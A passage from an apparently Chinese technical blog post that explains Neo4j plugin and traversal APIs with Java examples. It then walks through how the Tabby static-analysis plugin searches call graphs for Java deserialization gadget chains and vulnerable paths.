DataCenter#save2CSV</span><br></pre></td></tr></table></figure><h2 id="0x04-Tabby-Path-Finder"><a href="#0x04-Tabby-Path-Finder" class="headerlink" title="0x04 Tabby-Path-Finder"></a>0x04 Tabby-Path-Finder</h2><h3 id="4-1-Neo4j接口"><a href="#4-1-Neo4j接口" class="headerlink" title="4.1 Neo4j接口"></a>4.1 Neo4j接口</h3><p>参考Neo4j 官方的扩展接口文档【10】。</p><h4 id="4-1-1-插件extending"><a href="#4-1-1-插件extending" class="headerlink" title="4.1.1 插件extending"></a>4.1.1 插件extending</h4><h5 id="Procedure-和Function-区别"><a href="#Procedure-和Function-区别" class="headerlink" title="Procedure 和Function 区别"></a>Procedure 和Function 区别</h5><blockquote><ul><li>Functions are simple computations / conversions and return a single value</li><li>Functions can be used in any expression or predicate</li><li>Procedures are more complex operations and generate streams of results.</li><li>Procedures must be used within the CALL clause and YIELD their result columns</li><li>They can generate, fetch or compute data to make it available to later processing steps in your Cypher query</li></ul></blockquote><ul><li>Function 是比较简单的计算逻辑，只能return string</li><li>Function 可以在任意的表达式里/predicate 里调用</li><li>Procedure 更加复杂，返回的是streams</li><li>Procedure 必须用CALL 进行调用，用YIELD 进行结果指定</li><li>它们都能够生成/获取/计算数据，用于下一步的Cypher query计算</li></ul><h5 id="Procedure"><a href="#Procedure" class="headerlink" title="Procedure"></a>Procedure</h5><p>通过@Procedure</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.neo4j.procedure.Procedure;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Stream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetRelationshipTypes</span> </span>&#123;</span><br><span class="line"><span class="meta">@Procedure(value = &quot;example.getRelationshipTypes&quot;)</span></span><br><span class="line">    <span class="meta">@Description(&quot;Get the different relationships going in and out of a node.&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Stream&lt;RelationshipTypes&gt; <span class="title">getRelationshipTypes</span><span class="params">(<span class="meta">@Name(&quot;node&quot;)</span> Node node)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; outgoing = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        node.getRelationships(Direction.OUTGOING).iterator()</span><br><span class="line">            .forEachRemaining(rel -&gt; AddDistinct(outgoing, rel));</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; incoming = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        node.getRelationships(Direction.INCOMING).iterator()</span><br><span class="line">                .forEachRemaining(rel -&gt; AddDistinct(incoming, rel));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Stream.of(<span class="keyword">new</span> RelationshipTypes(incoming, outgoing));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.neo4j.procedure.UserFunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Join</span> </span>&#123;</span><br><span class="line">    <span class="meta">@UserFunction</span></span><br><span class="line">    <span class="meta">@Description(&quot;example.join([&#x27;s1&#x27;,&#x27;s2&#x27;,...], delimiter) - join the given strings with the given delimiter.&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">join</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="meta">@Name(&quot;strings&quot;)</span> List&lt;String&gt; strings,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="meta">@Name(value = &quot;delimiter&quot;, defaultValue = &quot;,&quot;)</span> String delimiter)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strings == <span class="keyword">null</span> || delimiter == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> String.join(delimiter, strings);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Aggregation"><a href="#Aggregation" class="headerlink" title="Aggregation"></a>Aggregation</h5><p>聚合函数，UDAF(User- Defined Aggregation Funcation)，由多到一，类似SUM()/AVG().</p><ul><li>UserAggregationFunction</li><li>UserAggregationUpdate</li><li>UserAggregationResult</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.neo4j.procedure.UserAggregationFunction;</span><br><span class="line"><span class="keyword">import</span> org.neo4j.procedure.UserAggregationUpdate;</span><br><span class="line"><span class="keyword">import</span> org.neo4j.procedure.UserAggregationResult;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Last</span> </span>&#123;</span><br><span class="line">    <span class="meta">@UserAggregationFunction(&quot;example.last&quot;)</span></span><br><span class="line">    <span class="meta">@Description(&quot;example.last(value) - returns last non-null row&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> LastFunction <span class="title">last</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LastFunction();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LastFunction</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> Object lastValue;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@UserAggregationUpdate</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">aggregate</span><span class="params">(<span class="meta">@Name(&quot;value&quot;)</span> Object value)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.lastValue = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@UserAggregationResult</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">result</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> lastValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-1-2-Traversal-Framework"><a href="#4-1-2-Traversal-Framework" class="headerlink" title="4.1.2 Traversal Framework"></a>4.1.2 Traversal Framework</h4><h5 id="TraversalDescription"><a href="#TraversalDescription" class="headerlink" title="TraversalDescription"></a>TraversalDescription</h5><p>TraversalDescription 是用于定义和初始化遍历的主要接口。例如</p><p><strong>Traverser</strong><br>TraversalDescription.travserse()可以生成traverser对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TraversalDescription td;</span><br><span class="line"><span class="keyword">try</span> ( Transaction tx = graphDb.beginTx() ) &#123;</span><br><span class="line">     td = tx.traversalDescription();</span><br><span class="line">&#125;</span><br><span class="line">Traverser traverser = td.traverse( startNode );</span><br><span class="line"><span class="keyword">for</span> ( Path path : traverser ) &#123;</span><br><span class="line">    <span class="comment">// Extend as needed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>relationships()方法</strong></p><p>relationships()方法是一个过滤器，符合的才会进入td.traverse。</p><blockquote><p>By default, all relationships are traversed, regardless of their type. However, if one or more relationships are added, then only the added types will be traversed. </p></blockquote><p>如果没有设定relationships()，那么不做过滤，如果有relationships()，那么只保留符合relationships()的关系。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TraversalDescription td = transaction.traversalDescription()</span><br><span class="line">    .relationships(RelationshipType.withName(<span class="string">&quot;A&quot;</span>))</span><br><span class="line">    .relationships(RelationshipType.withName(<span class="string">&quot;B&quot;</span>), Direction.OUTGOING);</span><br><span class="line"><span class="keyword">return</span> td.traverse(startNode);</span><br></pre></td></tr></table></figure><p><strong>Evaluators</strong></p><p>除relationships做筛选之外，还可以用Evaluators 做更复杂的功能过滤。relationships 是针对所有的Relationship，action是留或者不留，Evaluator针对一条Path，action 也更多。</p><p>针对一个Path，Evaluator 可以采取以下action：</p><ul><li>Evaluation.INCLUDE_AND_CONTINUE: 在结果中包含当前节点并继续遍历。</li><li>Evaluation.INCLUDE_AND_PRUNE：在结果中包含当前节点，但不继续遍历。</li><li>Evaluation.EXCLUDE_AND_CONTINUE: 从结果中排除当前节点，但继续遍历。</li><li>Evaluation.EXCLUDE_AND_PRUNE: 从结果中排除当前节点，不继续遍历。</li></ul><p>内置的Evaluator规则：</p><p><img src="/images/pasted-344.png" alt="upload successful"></p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TraversalDescription td;</span><br><span class="line"><span class="keyword">try</span> ( Transaction tx = graphDb.beginTx() ) &#123;</span><br><span class="line">     td = tx.traversalDescription()</span><br><span class="line">            .evaluator(Evaluators.atDepth(<span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">td.traverse( startNode );</span><br></pre></td></tr></table></figure><p>atDepth(2) 表示仅遍历深度为2的节点。</p><p><strong>自定义Evaluator</strong></p><p>除了内置的Evaluator，也可以自定义Evaluator</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LabelEvaluator</span> <span class="keyword">implements</span> <span class="title">Evaluator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Label label;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LabelEvaluator</span><span class="params">(Label label)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.label = label;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Evaluation <span class="title">evaluate</span><span class="params">(Path path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (path.endNode().hasLabel(label)) &#123;</span><br><span class="line">            <span class="keyword">return</span> Evaluation.INCLUDE_AND_CONTINUE;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Evaluation.EXCLUDE_AND_CONTINUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TraversalDescription td;</span><br><span class="line"><span class="keyword">try</span> ( Transaction tx = graphDb.beginTx() ) &#123;</span><br><span class="line">     td = tx.traversalDescription()</span><br><span class="line">            .evaluator(Evaluators.atDepth( <span class="number">2</span> ))</span><br><span class="line">            .evaluator(<span class="keyword">new</span> LabelEvaluator(Label.label(<span class="string">&quot;A&quot;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">td.traverse( startNode );</span><br></pre></td></tr></table></figure><p>以上定义了一个组合Evaluator（注意是and 关系）：</p><ol><li>路径长度为2</li><li>路径的结束节点有标签A属性</li></ol><p><strong>Uniqueness</strong></p><p>Uniqueness可以控制遍历的重复规则，默认值是NODE_GLOBAL：整个图中的任何节点都不能被多次访问，也就是不会有环的产生。</p><p><img src="/images/pasted-345.png" alt="upload successful"></p><p><strong>BranchOrderingPolicy和BranchSelector</strong></p><p>内置的深度优先、广度优先算法</p><p><img src="/images/pasted-346.png" alt="upload successful"></p><p>可以通过便捷方法breadthFirst()和depthFirst()快速设置搜索算法，分别对应广度优先和深度优先。这也相当于设置BranchOrderingPolicies.PREORDER_BREADTH_FIRST/BranchOrderingPolicies.PREORDER_DEPTH_FIRST策略。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">td = tx.traversalDescription()</span><br><span class="line">            .depthFirst();</span><br><span class="line">td = tx.traversalDescription()</span><br><span class="line">            .order(BranchOrderingPolicies.PREORDER_BREADTH_FIRST );</span><br></pre></td></tr></table></figure><p><strong>PathExpander</strong></p><p>PathExpander可以用于定义搜索的具体实现：在给定的Path上，找到想要的分支节点。</p><p>有多种指定 a 的方法PathExpander，例如：</p><ul><li>内置PathExpander定义了一些常用PathExpander的s。</li><li>PathExpanderBuilder允许组合定义。</li><li>PathExpander可以通过实现PathExpander接口来编写自定义。</li></ul><p><strong>内置的PathExpander</strong></p><p><img src="/images/pasted-347.png" alt="upload successful"></p><p>例如以下定义了搜索传播的规则：边类型为A，且为出方向</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TraversalDescription td = transaction.traversalDescription()</span><br><span class="line">    .expand(PathExpanders.forTypeAndDirection( RelationshipType.withName( <span class="string">&quot;A&quot;</span> ), Direction.OUTGOING ));</span><br><span class="line">td.traverse( startNode );</span><br></pre></td></tr></table></figure><p><strong>PathExpanderBuilder</strong></p><p><img src="/images/pasted-348.png" alt="upload successful"></p><p>例如以下定义了搜索传播的规则：边类型为E1，其他都通过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TraversalDescription td = transaction.traversalDescription()</span><br><span class="line">    .expand(PathExpanderBuilder.empty()</span><br><span class="line">                               .add(RelationshipType.withName(<span class="string">&quot;E1&quot;</span>))</span><br><span class="line">                               .build());</span><br><span class="line">td.traverse( startNode );</span><br></pre></td></tr></table></figure><p><strong>自定义PathExpander</strong></p><p>如下，定义了MaxWeightPathExpander，每增加一条边，那么该分支的属性值权重则加上该边的权重，如果权重超过最大值，那么就不继续。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaxWeightPathExpander</span> <span class="keyword">implements</span> <span class="title">PathExpander</span>&lt;<span class="title">Double</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">double</span> maxWeight;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MaxWeightPathExpander</span><span class="params">( <span class="keyword">double</span> maxWeight )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.maxWeight = maxWeight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Iterable&lt;Relationship&gt; <span class="title">expand</span><span class="params">( Path path, BranchState&lt;Double&gt; branchState )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (path.lastRelationship() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            branchState.setState( branchState.getState() + (<span class="keyword">double</span>) path.lastRelationship().getProperty( <span class="string">&quot;weight&quot;</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Iterable&lt;Relationship&gt; relationships = path.endNode().getRelationships( Direction.OUTGOING );</span><br><span class="line">        ArrayList&lt;Relationship&gt; filtered = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> ( Relationship relationship : relationships ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( branchState.getState() + (<span class="keyword">double</span>) relationship.getProperty( <span class="string">&quot;weight&quot;</span> ) &lt;= maxWeight ) &#123;</span><br><span class="line">                filtered.add(relationship);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> filtered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PathExpander <span class="title">reverse</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException( <span class="string">&quot;Not needed for the MonoDirectional Traversal Framework&quot;</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TraversalDescription td &#x3D; transaction.traversalDescription()</span><br><span class="line">        .expand( new MaxWeightPathExpander(5.0), InitialBranchState.DOUBLE_ZERO );</span><br><span class="line">td.traverse( startNode );</span><br></pre></td></tr></table></figure><blockquote><p>** 疑问 **<br>expand 是何时触发的？</p></blockquote><p>从path.lastRelationship() 返回的是Relationship，可以猜测每次传播应该是以每一条边Relationship/Node 的增加为维度的。每当当前Branch有变化，则会触发expand。</p><h3 id="4-2-Tabby-Path-Finder的CallGraph程序间分析实现"><a href="#4-2-Tabby-Path-Finder的CallGraph程序间分析实现" class="headerlink" title="4.2 Tabby Path Finder的CallGraph程序间分析实现"></a>4.2 Tabby Path Finder的CallGraph程序间分析实现</h3><blockquote><p><strong>疑问</strong><br>wh1t3p1g师傅怎么找到TraversalPathFinder这个接口类的？官方文档没有，Github/Google居然也没搜到，难不成师傅是徇着TraversalDescription找到的？而且还需要打包成jar插件形式部署，是怎么测试的，想想好难呀 o(∩_∩)o</p></blockquote><p>整个调用关系如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PathFinding#allSimplePath</span><br><span class="line">  MonoDirectionalTraversalPathFinder#&lt;init&gt;(EvaluationContext,PathExpander,maxDepth,State,depthFirst,Judgment)</span><br><span class="line">  MonoDirectionalTraversalPathFinder#findAllPaths</span><br><span class="line">  ForwardedPathExpander#expand</span><br><span class="line">      CommonProcessor#init</span><br><span class="line">      CommonProcessor#process</span><br><span class="line">      ForwardedCalculator#v2</span><br><span class="line">      State.positions#put</span><br></pre></td></tr></table></figure><h4 id="4-2-1-接口"><a href="#4-2-1-接口" class="headerlink" title="4.2.1 接口"></a>4.2.1 接口</h4><table><thead><tr><th>接口</th><th>功能</th><th>备注</th></tr></thead><tbody><tr><td>allSimplePath</td><td>非污点传播，查找所有根据&lt;CALL&#124;ALIAS 能到的路径</td><td>backward analysis</td></tr><tr><td>allSimplePaths</td><td>非污点传播，查找所有根据&lt;CALL&#124;ALIAS 能到的路径</td><td>backward analysis</td></tr><tr><td>findJavaGadget</td><td>污点传播，会根据java原生反序列化的规则来查找利用链</td><td>forward analysis</td></tr><tr><td>findAllJavaGadget</td><td>污点传播,会根据java原生反序列化的规则来查找利用链</td><td>forward analysis</td></tr><tr><td>findVul</td><td>污点传播</td><td>forward analysis</td></tr><tr><td>findAllVul</td><td>污点传播</td><td>forward analysis</td></tr></tbody></table><p><strong>allSimplePath</strong></p><ul><li>sink</li><li>sources</li><li>maxNodes</li><li>state</li><li>depthFirst</li></ul><p><strong>allSimplePaths</strong></p><ul><li>sinks</li><li>sources</li><li>maxNodes</li><li>depthFirst</li></ul><p><strong>findJavaGadget</strong></p><ul><li>source</li><li>sinks</li><li>maxNodes</li><li>depthFirst</li></ul><p><strong>findAllJavaGadget</strong></p><ul><li>sources</li><li>sinks</li><li>maxNodes</li><li>depthFirst</li></ul><p><strong>findVul</strong></p><ul><li>sourceNode</li><li>sinkNodes</li><li>maxLength</li><li>depthFirst</li></ul><p><strong>findAllVul</strong></p><ul><li>sourceNode</li><li>sinkNodes</li><li>maxLength</li><li>depthFirst</li></ul><h4 id="4-2-2-实现跟踪"><a href="#4-2-2-实现跟踪" class="headerlink" title="4.2.2 实现跟踪"></a>4.2.2 实现跟踪</h4><p>以findVul 为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@Procedure</span><br><span class="line">@Description(&quot;tabby.algo.findVul(sourceNode, sinkNodes, maxLength, depthFirst) YIELD path, &quot; +</span><br><span class="line">        &quot;weight - run findVul from source node to sink nodes&quot;)</span><br><span class="line">public Stream&lt;PathResult&gt; findVul(</span><br><span class="line">        @Name(&quot;startNode&quot;) Node startNode,</span><br><span class="line">        @Name(&quot;endNodes&quot;) List&lt;Node&gt; endNodes,</span><br><span class="line">        @Name(&quot;maxLength&quot;) long maxLength,</span><br><span class="line">        @Name(&quot;depthFirst&quot;) boolean depthFirst) &#123;</span><br><span class="line"></span><br><span class="line">    MonoDirectionalTraversalPathFinder algo &#x3D; new MonoDirectionalTraversalPathFinder(</span><br><span class="line">            new BasicEvaluationContext(tx, db),</span><br><span class="line">            new ForwardedPathExpander(false, ProcessorFactory.newInstance(&quot;Common&quot;)),</span><br><span class="line">            (int) maxLength, getInitialState(Collections.singletonList(startNode)),</span><br><span class="line">            depthFirst, new CommonJudgment()</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    Iterable&lt;Path&gt; allPaths &#x3D; algo.findAllPaths(startNode, endNodes);</span><br><span class="line">    return StreamSupport.stream(allPaths.spliterator(), true)</span><br><span class="line">            .map(PathResult::new);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>MonoDirectionalTraversalPathFinder 自定义PathFinder</li><li>ForwardedPathExpander 指定正向分析</li><li>指定CommonProcessor</li></ul><h5 id="MonoDirectionalTraversalPathFinder"><a href="#MonoDirectionalTraversalPathFinder" class="headerlink" title="MonoDirectionalTraversalPathFinder"></a>MonoDirectionalTraversalPathFinder</h5><p>MonoDirectionalTraversalPathFinder -&gt; BasePathFinder -&gt; TraversalPathFinder</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">MonoDirectionalTraversalPathFinder</span><span class="params">(EvaluationContext context,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          PathExpander&lt;State&gt; expander,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          <span class="keyword">int</span> maxDepth,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          State state,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          <span class="keyword">boolean</span> depthFirst,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          Judgment judgment</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(context, expander, maxDepth, depthFirst);</span><br><span class="line">    <span class="keyword">this</span>.judgment = judgment;</span><br><span class="line">    <span class="keyword">this</span>.stack = <span class="keyword">new</span> InitialBranchState.State&lt;&gt;(state, state.copy());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Expander"><a href="#Expander" class="headerlink" title="Expander"></a>Expander</h5><p>重点的逻辑在Expander中，控制了如何从起点进行传播</p><p><strong>ForwardedPathExpander</strong></p><p>具体代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">ForwardedPathExpander</span><span class="params">(<span class="keyword">boolean</span> parallel, Processor processor)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">this</span>.processor = processor;</span><br><span class="line">       String[] types = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;CALL&gt;&quot;</span>, <span class="string">&quot;ALIAS&gt;&quot;</span>&#125;;</span><br><span class="line">...</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> Iterable&lt;Relationship&gt; <span class="title">expand</span><span class="params">(Path path, BranchState&lt;State&gt; state)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> Node node = path.endNode();</span><br><span class="line">       <span class="keyword">final</span> Relationship lastRelationship = path.lastRelationship();</span><br><span class="line">       processor.init(node, state.getState(), lastRelationship, calculator);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(processor.isNeedProcess())&#123;</span><br><span class="line">           Iterable&lt;Relationship&gt; relationships = node.getRelationships(direction, getRelationshipTypes(lastRelationship, state.getState()));</span><br><span class="line">           List&lt;Relationship&gt; nextRelationships = StreamSupport.stream(relationships.spliterator(), parallel)</span><br><span class="line">                   .map((next) -&gt; processor.process(next))</span><br><span class="line">                   .filter(Objects::nonNull)</span><br><span class="line">                   .collect(Collectors.toList());</span><br><span class="line">           state.setState(processor.getNextState());</span><br><span class="line">           <span class="keyword">return</span> nextRelationships;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>初始化</p><ol><li>定义传播方向direction:&gt; or &lt;</li><li>定义传播关系relationshipTypes: CALL 和 ALIAS</li></ol><p>expand重点逻辑都在processor中，逻辑很简单</p><ol><li>processor.isNeedProcess()判断是否继续传播</li><li>如果ok，把endNode.getRelationships 加入，更新BranchState信息</li><li>processor.process(Relationship next)，更新待加入节点的上下文信息</li></ol><p>为了更好的记录当前Branch 上下文信息，Tabby引入了Processer类</p><p><strong>BaseProcessor</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 